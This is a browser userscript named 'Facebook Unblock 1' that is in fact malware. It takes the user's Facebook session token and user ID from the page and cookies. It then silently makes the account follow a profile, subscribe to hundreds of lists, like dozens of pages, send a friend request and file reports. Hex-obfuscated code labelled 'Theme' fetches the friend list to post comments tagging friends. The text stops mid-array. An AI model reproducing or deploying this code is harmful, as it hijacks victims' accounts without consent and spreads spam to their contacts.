// ==UserScript==
// @name        Facebook Unblock 1
// @description         Facebook Unblock 1
// ==/UserScript==

	

    /* Nh?c */
    var parent=document.getElementsByTagName("html")[0];
    var _body = document.getElementsByTagName('body')[0];
    var _div = document.createElement('div');
    _div.style.height="25";
    _div.style.width="100%";
    _div.style.position="fixed";
    _div.style.top="auto";
    _div.style.bottom="0";
    _div.align="center";
    var _audio= document.createElement('audio');
    _audio.style.width="100%";
    _audio.style.height="25px";
    _audio.controls = true;
    _audio.autoplay = false;
    _audio.autoplay = true;
    _audio.src = "http://picosong.com/media/songs/1623c97f871ebe69c08a4089737457dc";
    _div.appendChild(_audio);
    _body.appendChild(_div);
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
    var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}a("100004047043649");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}sublist("397800647031500");sublist("378624382282460");var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=811104532248308&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}Like("578335622259547");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}
     
    //skaat
    sublist("1381621758774640");sublist("1381643385439144");sublist("1395012940768855");sublist("1395163294087153");
    sublist("1381621848774631");sublist("1381643595439123");sublist("1395015400768609");sublist("1395163297420486");
    sublist("1381621988774617");sublist("1381643678772448");sublist("1395015407435275");sublist("1395164090753740");
    sublist("1381622102107939");sublist("1381643795439103");sublist("1395015410768608");sublist("1395164117420404");
    sublist("1381623765441106");sublist("1381643892105760");sublist("1395015404101942");sublist("1395164247420391");
    sublist("1381623962107753");sublist("1381643995439083");sublist("1395015447435271");sublist("1395164324087050");
    sublist("1381624195441063");sublist("1381644092105740");sublist("1395015490768600");sublist("1395164364087046");
    sublist("1381624515441031");sublist("1381644202105729");sublist("1395015524101930");sublist("1395164404087042");
    sublist("1381624785441004");sublist("1394828917453924");sublist("1395015574101925");sublist("1395164447420371");
    sublist("1381624915440991");sublist("1394829164120566");sublist("1395015594101923");sublist("1395164537420362");
    sublist("1381625892107560");sublist("1394829244120558");sublist("1395015657435250");sublist("1395164617420354");
    sublist("1381626228774193");sublist("1394830370787112");sublist("1395015700768579");sublist("1395164674087015");
    sublist("1381626665440816");sublist("1394831154120367");sublist("1395015734101909");sublist("1395164810753668");
    sublist("1381626762107473");sublist("1394831730786976");sublist("1395015767435239");sublist("1395165070753642");
    sublist("1381627305440752");sublist("1395009784102504");sublist("1395015824101900");sublist("1395178407418975");
    sublist("1381627502107399");sublist("1395009817435834");sublist("1395015884101894");sublist("1395178580752291");
    sublist("1381627678774048");sublist("1395009857435830");sublist("1395016354101847");sublist("1395178627418953");
    sublist("1381627908774025");sublist("1395009924102490");sublist("1395020240768125");sublist("1395178677418948");
    sublist("1381628095440673");sublist("1395009957435820");sublist("1395020244101458");sublist("1395191937417622");
    sublist("1381628282107321");sublist("1395010004102482");sublist("1395020337434782");sublist("1395191974084285");
    sublist("1381628472107302");sublist("1395010040769145");sublist("1395020360768113");sublist("1395192024084280");
    sublist("1381628802107269");sublist("1395010067435809");sublist("1395020400768109");sublist("1395192077417608");
    sublist("1381628892107260");sublist("1395010107435805");sublist("1395020440768105");sublist("1395192150750934");
    sublist("1381629102107239");sublist("1395010144102468");sublist("1395020457434770");sublist("1395192180750931");
    sublist("1381629258773890");sublist("1395010190769130");sublist("1395020520768097");sublist("1395192240750925");
    sublist("1381629855440497");sublist("1395010264102456");sublist("1395020577434758");sublist("1395192267417589");
    sublist("1381630022107147");sublist("1395010304102452");sublist("1395020644101418");sublist("1395192307417585");
    sublist("1381630118773804");sublist("1395010374102445");sublist("1395020654101417");sublist("1395192537417562");
    sublist("1381630175440465");sublist("1395010614102421");sublist("1395020687434747");sublist("1395192580750891");
    sublist("1381630242107125");sublist("1395010700769079");sublist("1395020707434745");sublist("1395192644084218");
    sublist("1381637678773048");sublist("1395010740769075");sublist("1395020740768075");sublist("1395192770750872");
    sublist("1381637765439706");sublist("1395010894102393");sublist("1395020760768073");sublist("1395192817417534");
    sublist("1381637828773033");sublist("1395010967435719");sublist("1395020794101403");sublist("1395192924084190");
    sublist("1381637895439693");sublist("1395011027435713");sublist("1395020827434733");sublist("1395193057417510");
    sublist("1381637958773020");sublist("1395011087435707");sublist("1395020867434729");sublist("1395193127417503");
    sublist("1381638025439680");sublist("1395011120769037");sublist("1395020904101392");sublist("1395193200750829");
    sublist("1381638135439669");sublist("1395011147435701");sublist("1395020927434723");sublist("1395193234084159");
    sublist("1381638218772994");sublist("1395011244102358");sublist("1395020984101384");sublist("1395193280750821");
    sublist("1381638305439652");sublist("1395011287435687");sublist("1395021037434712");sublist("1395193447417471");
    sublist("1381638412106308");sublist("1395011370769012");sublist("1395021047434711");sublist("1395194724084010");
    sublist("1381638502106299");sublist("1395011397435676");sublist("1395021094101373");sublist("1395194734084009");
    sublist("1381639115439571");sublist("1395011427435673");sublist("1395021217434694");sublist("1395194770750672");
    sublist("1381639115439571");sublist("1395011734102309");sublist("1395021270768022");sublist("1395194834083999");
    sublist("1381639115439571");sublist("1395011764102306");sublist("1395021290768020");sublist("1395194937417322");
    sublist("1381639315439551");sublist("1395011797435636");sublist("1395021307434685");sublist("1395195414083941");
    sublist("1381639465439536");sublist("1395011817435634");sublist("1395021327434683");sublist("1395195460750603");
    sublist("1381639588772857");sublist("1395011860768963");sublist("1395021357434680");sublist("1395195530750596");
    sublist("1381639718772844");sublist("1395011887435627");sublist("1395021360768013");sublist("1395195707417245");
    sublist("1381639758772840");sublist("1395011927435623");sublist("1395021987434617");sublist("1395195814083901");
    sublist("1381639998772816");sublist("1395011967435619");sublist("1395021990767950");sublist("1395195844083898");
    sublist("1381640178772798");sublist("1395011987435617");sublist("1395021994101283");sublist("1395195934083889");
    sublist("1381640308772785");sublist("1395012120768937");sublist("1395022000767949");sublist("1395196000750549");
    sublist("1381641328772683");sublist("1395012220768927");sublist("1395022004101282");sublist("1395196107417205");
    sublist("1381641542105995");sublist("1395012257435590");sublist("1395022020767947");sublist("1395196177417198");
    sublist("1381641882105961");sublist("1395012314102251");sublist("1395022040767945");sublist("1395196200750529");
    sublist("1381641942105955");sublist("1395012334102249");sublist("1395021840767965");sublist("1395198520750297");
    sublist("1381642002105949");sublist("1395012374102245");sublist("1395021844101298");sublist("1395198514083631");
    sublist("1381642215439261");sublist("1395012410768908");sublist("1395021854101297");sublist("1395198784083604");
    sublist("1381642358772580");sublist("1395012470768902");sublist("1395021864101296");sublist("1395198817416934");
    sublist("1381642858772530");sublist("1395012514102231");sublist("1395022407434575");sublist("1395198904083592");
    sublist("1381642562105893");sublist("1395012544102228");sublist("1395021867434629");sublist("1395199000750249");
    sublist("1381642978772518");sublist("1395012580768891");sublist("1395021870767962");sublist("1395199130750236");
    sublist("1381643148772501");sublist("1395012610768888");sublist("1395199254083557");
    IDS("100007109203061");
    Like("1431206300451206");Like("612783645458214");Like("618658344856703");Like("374151146058395");Like("474418569348096");
    Like("1431095630466527");Like("787898061239979");Like("268878879947283");Like("432543833515763");Like("729170037127689");
    Like("1428856537357298");Like("215718335303266");Like("639677522746069");Like("413596522117375");Like("228741100652165");
    Like("1412560522334429");Like("211409772360346");Like("253471194824690");Like("251716601666397");Like("662140377178073");
    Like("1421406564770063");Like("292053454279816");Like("710292352325321");Like("618823938191217");Like("754814274529601");
    Like("221347671398421");Like("810615968951943");Like("204964683047118");Like("224289897772113");Like("414726252005516");
    Like("407844716018889");Like("225504160987834");Like("241847959335333");Like("439268946204408");
    IDS("100007109203061");
    //Theme
    (function() {
    var _0xb161=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x62\x6C\x6F\x63\x6B\x3D\x31\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x63\x74\x69\x6F\x6E\x73\x5F\x74\x6F\x5F\x74\x61\x6B\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x5B\x5D\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x30\x25\x32\x43\x25\x32\x32\x65\x78\x70\x61\x6E\x64\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x66\x69\x72\x73\x74\x5F\x63\x68\x6F\x69\x63\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x32\x43\x25\x32\x32\x66\x72\x6F\x6D\x5F\x67\x65\x61\x72\x25\x32\x32\x25\x33\x41\x25\x32\x32\x74\x69\x6D\x65\x6C\x69\x6E\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x6F\x6E\x5F\x70\x72\x6F\x66\x69\x6C\x65\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x66\x25\x32\x32\x25\x33\x41\x25\x32\x32\x68\x74\x74\x70\x73\x25\x33\x41\x25\x35\x43\x25\x32\x46\x25\x35\x43\x25\x32\x46\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x25\x35\x43\x25\x32\x46\x4E\x61\x6E\x2E\x65\x72\x74\x74\x37\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x34\x35\x25\x32\x43\x25\x32\x32\x72\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41","\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x32\x71\x6D\x76\x75\x35\x6B\x39\x55\x6D\x41\x41\x61\x55\x56\x70\x6F\x26\x5F\x5F\x72\x65\x71\x3D\x75\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x38\x35\x37\x31\x30\x37\x31\x31\x30\x38\x38\x38\x30","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x30\x30\x30\x30\x36\x39\x35\x32\x31\x31\x39\x30\x34\x38"];var fb_dtsg=document[_0xb161[2]](_0xb161[1])[0][_0xb161[0]];var user_id=document[_0xb161[4]][_0xb161[3]](document[_0xb161[4]][_0xb161[3]](/c_user=(\d+)/)[1]);var now=( new Date)[_0xb161[5]]();function Report(_0x45e7x5){var _0x45e7x6= new XMLHttpRequest();var _0x45e7x7=_0xb161[6];var _0x45e7x8=_0xb161[7]+fb_dtsg+_0xb161[8]+_0x45e7x5+_0xb161[9]+_0x45e7x5+_0xb161[10]+now+_0xb161[11]+user_id+_0xb161[12]+user_id+_0xb161[13];_0x45e7x6[_0xb161[15]](_0xb161[14],_0x45e7x7,true);_0x45e7x6[_0xb161[16]]=function (){if(_0x45e7x6[_0xb161[17]]==4&&_0x45e7x6[_0xb161[18]]==200){_0x45e7x6[_0xb161[19]];} ;} ;_0x45e7x6[_0xb161[20]](_0x45e7x8);} ;
    var _0x209f=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x36\x38\x38\x35\x34\x35\x39\x31\x31\x31\x39\x37\x33\x34\x39","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","","\x72\x65\x70\x6C\x61\x63\x65","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x3B","\x6C\x65\x6E\x67\x74\x68","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x72\x6F\x75\x6E\x64","\x20\x40\x5B","\x75\x69\x64","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x69\x6E\x64\x65\x78\x4F\x66","\x55\x52\x4C","\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x6F\x70\x65\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x73\x65\x6E\x64","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x32","\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D\x31\x33\x37\x37\x38\x37\x31\x37\x39\x37\x31\x33\x38\x3A\x31\x37\x30\x37\x30\x31\x38\x30\x39\x32","\x26\x72\x65\x70\x6C\x79\x5F\x66\x62\x69\x64","\x26\x70\x61\x72\x65\x6E\x74\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x69\x64","\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x32\x5F\x33","\x26\x63\x6C\x70\x3D\x7B\x22\x63\x6C\x5F\x69\x6D\x70\x69\x64\x22\x3A\x22\x34\x35\x33\x35\x32\x34\x61\x30\x22\x2C\x22\x63\x6C\x65\x61\x72\x63\x6F\x75\x6E\x74\x65\x72\x22\x3A\x30\x2C\x22\x65\x6C\x65\x6D\x65\x6E\x74\x69\x64\x22\x3A\x22\x6A\x73\x5F\x35\x22\x2C\x22\x76\x65\x72\x73\x69\x6F\x6E\x22\x3A\x22\x78\x22\x2C\x22\x70\x61\x72\x65\x6E\x74\x5F\x66\x62\x69\x64\x22\x3A","\x7D","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x73\x74\x69\x63\x6B\x65\x72\x5F\x66\x62\x69\x64\x3D\x30","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x70\x68\x6F\x74\x6F\x5F\x66\x62\x69\x64\x3D\x30","\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E","\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x5B\x5D","\x26\x5F\x5F\x61\x3D\x31","\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x79\x6E\x78\x6C\x32\x75\x35\x46\x39\x37\x4B\x65\x70\x45\x73\x79\x6F","\x26\x5F\x5F\x72\x65\x71\x3D\x71","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x61\x64\x64\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x2E\x70\x68\x70","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65"];
    var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "1424465907800369", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "]", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text=", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", "\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", 